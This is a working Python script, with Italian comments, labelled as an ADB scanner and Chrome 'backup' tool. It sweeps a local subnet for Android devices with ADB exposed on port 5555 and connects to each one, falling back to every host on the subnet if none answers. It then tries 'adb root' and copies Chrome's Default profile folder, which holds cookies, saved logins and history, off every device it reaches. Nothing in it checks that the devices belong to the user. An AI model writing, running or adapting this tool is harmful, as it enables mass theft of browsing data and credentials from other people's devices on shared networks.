#!/usr/bin/env python3
"""
ADB Network Scanner & Chrome Data Backup Tool
Scansiona la rete locale per dispositivi con ADB aperto sulla porta 5555
e copia tutta la cartella /data/data/com.android.chrome/app_chrome/Default
localmente in una cartella con nome IP senza spegnere il dispositivo.
"""

import socket
import ipaddress
import threading
from queue import Queue
from typing import List
import subprocess
import sys
import time
import os

class ADBScanner:
    def __init__(self, subnet: str = None, port: int = 5555, timeout: float = 1.0, threads: int = 50):
        self.port = port
        self.timeout = timeout
        self.threads = threads
        self.open_devices = []
        self.print_lock = threading.Lock()
        self.queue = Queue()
        if subnet is None:
            self.subnet = self.get_local_subnet()
        else:
            self.subnet = subnet
        print(f"[*] Subnet da scannerizzare: {self.subnet}")
        print(f"[*] Porta target: {self.port}")
        print(f"[*] Thread utilizzati: {self.threads}")
        print(f"[*] Timeout: {self.timeout}s\n")

    def get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(0)
            s.connect(('10.254.254.254', 1))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception:
            return '127.0.0.1'

    def get_local_subnet(self) -> str:
        local_ip = self.get_local_ip()
        network = ipaddress.ip_network(f"{local_ip}/24", strict=False)
        return str(network)

    def check_port(self, ip: str) -> bool:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((ip, self.port))
            sock.close()
            return result == 0
        except Exception:
            return False

    def scan_worker(self):
        while True:
            ip = self.queue.get()
            if ip is None:
                break
            if self.check_port(ip):
                with self.print_lock:
                    print(f"[+] DISPOSITIVO TROVATO: {ip}:{self.port}")
                    self.open_devices.append(ip)
            self.queue.task_done()

    def scan_network(self) -> List[str]:
        print(f"[*] Inizio scansione...\n")
        start_time = time.time()
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.scan_worker)
            t.daemon = True
            t.start()
            threads.append(t)

        network = ipaddress.ip_network(self.subnet)
        for ip in network.hosts():
            self.queue.put(str(ip))

        self.queue.join()

        for _ in range(self.threads):
            self.queue.put(None)
        for t in threads:
            t.join()

        elapsed_time = time.time() - start_time
        print(f"\n[*] Scansione completata in {elapsed_time:.2f} secondi")
        print(f"[*] Dispositivi trovati: {len(self.open_devices)}\n")

        return self.open_devices

    def connect_adb(self, ip: str) -> bool:
        try:
            cmd = f"adb connect {ip}:{self.port}"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            connected = "connected" in result.stdout.lower() or "already connected" in result.stdout.lower()
            with self.print_lock:
                if connected:
                    print(f"[✓] Connesso ad {ip}")
                else:
                    print(f"[-] Fallita connessione ad {ip}")
            return connected
        except Exception as e:
            with self.print_lock:
                print(f"[-] Errore connessione ADB a {ip}: {str(e)}")
            return False

    def backup_chrome_data(self, ip: str):
        try:
            local_dir = os.path.join(os.getcwd(), ip)
            if not os.path.exists(local_dir):
                os.makedirs(local_dir)
            # Prova a mettere ADB in modalità root (richiede dispositivo rootato)
            subprocess.run("adb root", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
            remote_path = "/data/data/com.android.chrome/app_chrome/Default"
            print(f"[*] Copia cartella Chrome Default da {ip} in {local_dir} ...")
            cmd_pull = f"adb -s {ip}:5555 pull {remote_path} {local_dir}"
            result = subprocess.run(cmd_pull, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=120)
            if result.returncode == 0:
                print(f"[✓] Backup completato per {ip}")
            else:
                print(f"[-] Errore nel backup chrome da {ip}: {result.stderr}")
        except Exception as e:
            print(f"[-] Exception durante backup chrome da {ip}: {str(e)}")

def main():
    print("=" * 60)
    print("  ADB Network Scanner & Chrome Data Backup Tool")
    print("=" * 60)
    print()
    try:
        result = subprocess.run("adb version", shell=True, capture_output=True, text=True, timeout=5)
        if result.returncode != 0:
            print("[!] ATTENZIONE: ADB non sembra essere installato o non è nel PATH")
            print("[!] Il tool funzionerà ma senza possibilità di backup")
            print()
    except Exception:
        print("[!] ATTENZIONE: Impossibile verificare l'installazione di ADB\n")

    # Input subnet interattivo con default automatico
    default_subnet = None
    try:
        dummy_scanner = ADBScanner()
        default_subnet = dummy_scanner.get_local_subnet()
    except:
        pass

    user_subnet = input(f"[?] Inserisci la subnet da scannerizzare (es: 192.168.1.0/24). Lascia vuoto per subnet automatica [{default_subnet}]: ").strip()
    if user_subnet:
        scanner = ADBScanner(subnet=user_subnet)
    else:
        subnet_to_scan = default_subnet if default_subnet else "192.168.1.0/24"
        scanner = ADBScanner(subnet=subnet_to_scan)

    devices = scanner.scan_network()
    # Prova comunque a tentare tutti gli IP della subnet anche se non hanno porta aperta
    if not devices:
        print("[!] Nessun dispositivo trovato con porta aperta, proverò comunque a connettermi a tutti gli IP della subnet\n")
        network = ipaddress.ip_network(scanner.subnet)
        devices = [str(ip) for ip in network.hosts()]

    for ip in devices:
        if scanner.connect_adb(ip):
            scanner.backup_chrome_data(ip)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Programma interrotto dall'utente")
        sys.exit(0)
